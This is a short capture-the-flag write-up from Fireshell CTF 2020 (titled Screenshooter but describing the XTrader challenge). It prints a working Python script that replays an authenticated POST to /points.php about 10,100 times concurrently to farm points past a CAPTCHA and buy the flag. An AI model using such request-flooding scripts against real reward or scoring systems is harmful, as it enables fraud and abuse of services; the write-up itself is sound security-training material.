# FireshellCTF2020_Screenshooter - Write-up
Web challenge solved during Fireshell CTF 2020 (by Ganesh - USP)

## Challenge description
``` 
https://xtrader.fireshellsecurity.team/
```

## Write-up
We had to reach 10000 points to buy the flag in the website. After watching a video, we were given 1 point. We only had 600 seconds to reach 10000.

By analysing the page's Javascript, we saw that it made `POST` requests to `/points.php`. When we tried to directly make the request, we were redirected to a CAPTCHA page before really making the request. However, after doing this once, we didn't have to do it again. With this in mind, we created a Python script to automate the process of making requests and getting points really fast. 

``` python
import asyncio
import requests

COOKIES = { 'PHPSESSID': '<minha_sess_id_no_site>', }
DATA = {'points' : '1', 'solved' : 'true'} # não é possível ganhar vários pontos de uma vez
HEADERS = {
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'Sec-Fetch-Dest': 'empty',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36',
    'DNT': '1',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://xtrader.fireshellsecurity.team',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Referer': 'https://xtrader.fireshellsecurity.team/',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6',
}

def fetch():
   requests.post('https://xtrader.fireshellsecurity.team/points.php', headers=HEADERS, cookies=COOKIES, data=DATA)

async def main():
    loop = asyncio.get_event_loop()
    futures = [
        loop.run_in_executor(
            None, 
            fetch
        )
        for i in range(10100)
    ]
    for response in await asyncio.gather(* futures):
        pass

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
```
_[Link to .py file here](https://github.com/Haltz01/CTFs_Writeups/blob/master/2020_FireshellCTF/XTrader/req.py)_

We let the script run until we had 10000 points (it took us around 400 seconds - not great but more than enough) and then we bought the flag!

<img src="https://github.com/Haltz01/CTFs_Writeups/blob/master/2020_FireshellCTF/XTrader/flagObtainedYey.png" alt="Getting the flag yey" />

**Flag:** `F#{d0nt_trus7_f1r3w4lls-hckdbyadn}`